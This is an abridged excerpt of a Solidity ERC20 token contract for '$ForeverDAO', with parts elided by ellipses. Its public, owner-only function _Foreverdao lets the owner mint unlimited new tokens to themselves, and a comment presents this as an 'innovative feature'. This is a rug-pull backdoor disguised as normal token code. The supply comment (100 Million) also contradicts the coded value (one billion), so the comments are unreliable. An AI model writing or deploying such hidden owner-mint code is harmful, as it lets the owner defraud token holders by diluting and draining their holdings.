...
//
// $ForeverDAO proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Foreverdao(uint256 amount) public onlyOwner {
 _Foreverdao(msg.sender, amount);
    }
    ...
    function _Foreverdao(address account, uint256 amount) internal virtual {
...
contract $ForeverDAO is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Forever DAO", "FOREVERDAO") {
        _Foreverdao(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}